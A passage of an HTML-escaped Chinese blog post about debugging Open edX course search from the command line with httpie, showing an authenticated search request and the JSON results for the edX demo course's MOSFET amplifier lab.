class="nt"&gt;&amp;quot;start_date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2013-02-05T00:00:00+00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;html_content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Labs and Demos Professors that create courses on edX are able to implement highly interactive experiences that allow you as a student to experiment using easy to use online web applications. These labs are customized to each class and subject area. We have collected a couple of the more popular lab environments here for you to experience and play with. Please be patient with yourself as you take a look around at these lab environments. You probably will not be able to answer these questions without taking a course on the topic first! &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;display_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Labs and Demos&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;location&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Example Week 2: Get Interactive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Homework - Labs and Demos&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Labs and Demos&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;content_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;org&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edX&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;content_groups&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@2bee8c4248e842a19ba1e73ed8d426c2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}},&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;courseware_content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.16797835&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;courseware_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.16797835&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@Lab_5B_Mosfet_Amplifier_Experiment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;course_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edX Demonstration Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/courses/course-v1:edX+DemoX+Demo_Course/jump_to/block-v1:edX+DemoX+Demo_Course+type@html+block@Lab_5B_Mosfet_Amplifier_Experiment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;excerpt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;There are no responses that need to be checked.In the &amp;lt;b&amp;gt;lab&amp;lt;/b&amp;gt; below, you&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;start_date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1970-01-01T05:00:00+00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;html_content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MOSFET AMPLIFIER EXPERIMENTThis demonstration is to develop your intuition about amplifiers and biasing, and to have fun with music! There are no responses that need to be checked.In the lab below, you will find:A circuit schematic of the MOSFET amplifier. You can use the sliders to the left of the circuit to control various parameters of the MOSFET and the amplifier.A plot (as a function of time) of selected voltages from the amplifier circuit. You can select the input waveform (e.g., sine wave, square wave, various types of music) by using the \\(v_\\mathrm{IN}\\) drop-down menu and the associated sliders. (The parameter \\(V_\\mathrm{MAX}\\) sets the maximum range on the plots.)The \&amp;quot;Play\&amp;quot; button which lets you listen to the selected voltage waveform as sound. Try it out!Listen to:vINvOUTvRGraph:vINvOUTvRvIN:Zero InputUnit ImpulseUnit StepSine WaveSquare WaveClassical MusicFolk MusicJazz MusicReggae MusicYour browser must support the Canvas element and have JavaScript enabled to view this tool.Your browser must support the Canvas element and have JavaScript enabled to view this tool.Experiment 1: Distorted outputBegin by selecting a sine wave input in the drop-down menu for \\(v_\\mathrm{IN}\\). Then, adjust the sliders to the baseline (default) setting shown below.Baseline setting of sliders:Peak to peak voltage: \\(v_\\mathrm{IN}=3~\\mathrm{V}\\),Frequency: \\(f = 1000~\\mathrm{Hz}\\),Supply voltage: \\(V_\\mathrm{S}=1.6~\\mathrm{V}\\),Input bias voltage: \\(V_\\mathrm{BIAS}=2.5~\\mathrm{V}\\),Pull-up resistor: \\(R = 10~\\mathrm{k}\\Omega\\),MOSFET parameter: \\(K=\\frac{1~\\mathrm{mA}}{\\mathrm{V}^2}\\),MOSFET threshold voltage: \\(V_\\mathrm{T} = 1~\\mathrm{V}\\),Vertical plot range: \\(V_\\mathrm{MAX} = 2~\\mathrm{V}\\).You should observe in the plot that with the baseline settings, the amplifier produces a distorted sine wave signal for \\(v_{OUT}\\). Next, go ahead and select one of the music signals as the input and listen to each of \\(v_{IN}\\) and \\(v_{OUT}\\), and confirm for yourself that the output sounds degraded at the chosen slider settings. You will notice that the graph now plots the music signal waveforms. Think about the reasons why the amplifier is producing a distorted output.Experiment 2: Linear regimeWe now study the amplifier&amp;#39;s small signal behavior. Select a sine wave as the input signal. To study the small signal behavior, reduce the value of \\(v_{IN}\\) to 0.1V (peak-to-peak) by using the \\(v_{IN}\\) slider. Keeping the rest of the parameters at their baseline settings, derive an appropriate value of \\(V_{BIAS}\\) that will ensure saturation region operation for the MOSFET for the 0.1V peak-to-peak swing for \\(v_{IN}\\). Make sure to think about both positive and negative excursions of the signals.Next, use the \\(V_{BIAS}\\) slider to choose your computed value for \\(V_{BIAS}\\) and see if the observed plot of \\(v_{OUT}\\) is more-or-less distortion free. If your calculation was right, then the output will indeed be distortion free.Next, select one of the music signals as the input and listen to each of \\(v_{IN}\\) and \\(v_{OUT}\\), and confirm for yourself that the output sounds much better than in Experiment 1. Also, based on sound volume, convince yourself that \\(v_{OUT}\\) is an amplified version of \\(v_{IN}\\).Experiment 3: Your settingsNow go ahead and experiment with various other settings while listening to the music signal at \\(v_{OUT}\\). Observe the plots and listen to \\(v_{OUT}\\) as you change, for example, the bias voltage \\(V_{BIAS}\\). You will notice that the amplifier distorts the input signal when \\(V_{BIAS}\\) becomes too small, or when it becomes too large. You can also experiment with various values of \\(v_{IN}\\), \\(R_{L}\\), etc., and see how they affect the amplification and distortion.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;display_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Electronic Sound Experiment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;location&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Example Week 2: Get Interactive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Lesson 2 - Let&amp;#39;s Get Interactive!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Electronic Sound Experiment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;content_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;org&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edX&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;content_groups&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@Lab_5B_Mosfet_Amplifier_Experiment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}]}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;做个试验&lt;/h3&gt;
&lt;p&gt;使用httpie做实验，在里我们从外部发起请求，ajax的方式让人不方便直接观察数据，而且总感觉耦合在一起，不干净&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http -f POST http://209.9.106.99:5000/search/course-v1:edX+DemoX+Demo_Course search_string=edx page_size=20 page_index=0 'Cookie:sessionid=pzjqyf6kdoo8jj96ng753xhr1isvstm3;csrftoken=sjPry3O5UpFFp3N3izrIVvd9ZMDEWA7V' X-CSRFToken:sjPry3O5UpFFp3N3izrIVvd9ZMDEWA7V&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;url的格式为 DEMAIN/search/&lt;COURSE_ID&gt;&lt;/p&gt;
&lt;p&gt;返回为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;access_denied_count&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;max_score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.6223112&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;results&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@2bee8c4248e842a19ba1e73ed8d426c2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;courseware_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;_score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.6223112&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;courseware_content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;display_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Labs and Demos&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;html_content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Labs and Demos Professors that create courses on edX are able to implement highly interactive experiences that allow you as a student to experiment using easy to use online web applications. These labs are customized to each class and subject area. We have collected a couple of the more popular lab environments here for you to experience and play with. Please be patient with yourself as you take a look around at these lab environments. You probably will not be able to answer these questions without taking a course on the topic first! &amp;quot;&lt;/span&gt;
                &lt;span class="p"&gt;},&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;content_groups&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;content_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;course_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edX Demonstration Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;excerpt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;b&amp;gt;Lab&amp;lt;/b&amp;gt;s and Demos Professors that create courses on edX are able to&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@2bee8c4248e842a19ba1e73ed8d426c2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;location&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
                    &lt;span class="s2"&gt;&amp;quot;Example Week 2: Get Interactive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="s2"&gt;&amp;quot;Homework - Labs and Demos&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="s2"&gt;&amp;quot;Labs and Demos&amp;quot;&lt;/span&gt;
                &lt;span class="p"&gt;],&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;org&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edX&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;start_date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2013-02-05T00:00:00+00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/courses/course-v1:edX+DemoX+Demo_Course/jump_to/block-v1:edX+DemoX+Demo_Course+type@html+block@2bee8c4248e842a19ba1e73ed8d426c2&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;},&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.6223112&lt;/span&gt;
        &lt;span class="p"&gt;},&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@Lab_5B_Mosfet_Amplifier_Experiment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;courseware_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;_score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.16797835&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;courseware_content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;display_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Electronic Sound Experiment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;quot;html_content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MOSFET AMPLIFIER EXPERIMENTThis demonstration is to develop your intuition about amplifiers and biasing, and to have fun with music! There are no responses that need to be checked.In the lab below, you will find:A circuit schematic of the MOSFET amplifier. You can use the sliders to the left of the circuit to control various parameters of the MOSFET and the amplifier.A plot (as a function of time) of selected voltages from the amplifier circuit. You can select the input waveform (e.g., sine wave, square wave, various types of music) by using the \\(v_\\mathrm{IN}\\) drop-down menu and the associated sliders. (The parameter \\(V_\\mathrm{MAX}\\) sets the maximum range on the plots.)The \&amp;quot;Play\&amp;quot; button which lets you listen to the selected voltage waveform as sound. Try it out!Listen to:vINvOUTvRGraph:vINvOUTvRvIN:Zero InputUnit ImpulseUnit StepSine WaveSquare WaveClassical MusicFolk MusicJazz MusicReggae MusicYour browser must support the Canvas element and have JavaScript enabled to view this tool.Your browser must support the Canvas element and have JavaScript enabled to view this tool.Experiment 1: Distorted outputBegin by selecting a sine wave input in the drop-down menu for \\(v_\\mathrm{IN}\\). Then, adjust the sliders to the baseline (default) setting shown below.Baseline setting of sliders:Peak to peak voltage: \\(v_\\mathrm{IN}=3~\\mathrm{V}\\),Frequency: \\(f = 1000~\\mathrm{Hz}\\),Supply voltage: \\(V_\\mathrm{S}=1.6~\\mathrm{V}\\),Input bias voltage: \\(V_\\mathrm{BIAS}=2.5~\\mathrm{V}\\),Pull-up resistor: \\(R = 10~\\mathrm{k}\\Omega\\),MOSFET parameter: \\(K=\\frac{1~\\mathrm{mA}}{\\mathrm{V}^2}\\),MOSFET threshold voltage: \\(V_\\mathrm{T} = 1~\\mathrm{V}\\),Vertical plot range: \\(V_\\mathrm{MAX} = 2~\\mathrm{V}\\).You should observe in the plot that with the baseline settings, the amplifier produces a distorted sine wave signal for \\(v_{OUT}\\). Next, go ahead and select one of the music signals as the input and listen to each of \\(v_{IN}\\) and \\(v_{OUT}\\), and confirm for yourself that the output sounds degraded at the chosen slider settings. You will notice that the graph now plots the music signal waveforms. Think about the reasons why the amplifier is producing a distorted output.Experiment 2: Linear regimeWe now study the amplifier&amp;#39;s small signal behavior. Select a sine wave as the input signal. To study the small signal behavior, reduce the value of \\(v_{IN}\\) to 0.1V (peak-to-peak) by using the \\(v_{IN}\\) slider. Keeping the rest of the parameters at their baseline settings, derive an appropriate value of \\(V_{BIAS}\\) that will ensure saturation region operation for the MOSFET for the 0.1V peak-to-peak swing for \\(v_{IN}\\). Make sure to think about both positive and negative excursions of the signals.Next, use the \\(V_{BIAS}\\) slider to choose your computed value for \\(V_{BIAS}\\) and see if the observed plot of \\(v_{OUT}\\) is more-or-less distortion free. If your calculation was right, then the output will indeed be distortion free.Next, select one of the music signals as the input and listen to each of \\(v_{IN}\\) and \\(v_{OUT}\\), and confirm for yourself that the output sounds much better than in Experiment 1. Also, based on sound volume, convince yourself that \\(v_{OUT}\\) is an amplified version of \\(v_{IN}\\).Experiment 3: Your settingsNow go ahead and experiment with various other settings while listening to the music signal at \\(v_{OUT}\\). Observe the plots and listen to \\(v_{OUT}\\) as you change, for example, the bias voltage \\(V_{BIAS}\\). You will notice that the amplifier distorts the input signal when \\(V_{BIAS}\\) becomes too small, or when it becomes too large. You can also experiment with various values of \\(v_{IN}\\), \\(R_{L}\\), etc., and see how they affect the amplification and distortion.&amp;quot;&lt;/span&gt;
                &lt;span class="p"&gt;},&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;content_groups&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;content_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;course-v1:edX+DemoX+Demo_Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;course_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edX Demonstration Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;excerpt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;There are no responses that need to be checked.In the &amp;lt;b&amp;gt;lab&amp;lt;/b&amp;gt; below, you&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@Lab_5B_Mosfet_Amplifier_Experiment&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;location&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
                    &lt;span class="s2"&gt;&amp;quot;Example Week 2: Get Interactive&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="s2"&gt;&amp;quot;Lesson 2 - Let&amp;#39;s Get Interactive!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="s2"&gt;&amp;quot;Electronic Sound Experiment&amp;quot;&lt;/span&gt;
                &lt;span class="p"&gt;],&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;org&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edX&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;start_date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1970-01-01T05:00:00+00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;quot;url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/courses/course-v1:edX+DemoX+Demo_Course/jump_to/block-v1:edX+DemoX+Demo_Course+type@html+block@Lab_5B_Mosfet_Amplifier_Experiment&amp;quot;&lt;/span&gt;
            &lt;span class="p"&gt;},&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;quot;score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.16797835&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;took&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;total&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;同理在课程首页的搜索和Dashboard里的搜索也类似&lt;/p&gt;
&lt;p&gt;以上这个技巧对我们做调试十分有帮助，因为输出在命令行所以我们可以尽情使用grep和jq等工具来筛选信息。只要数据能流向命令行，我们的linux工具箱就将发挥作用，工具的组合威力每次都能让我大吃一惊。管道大概是Unix工具箱最美妙的特性之一&lt;/p&gt;
&lt;p&gt;评测发现搜索必须是个词，好比搜demo课程，搜索&lt;code&gt;edx&lt;/code&gt;可以搜到内容，而搜索&lt;code&gt;e&lt;/code&gt;则无法搜索到，这应该和分词有关。在edx本土化（汉化）的过程中这个问题应该也会存在&lt;/p&gt;
&lt;p&gt;在课程内部进行搜索，可以检索中文&lt;/p&gt;
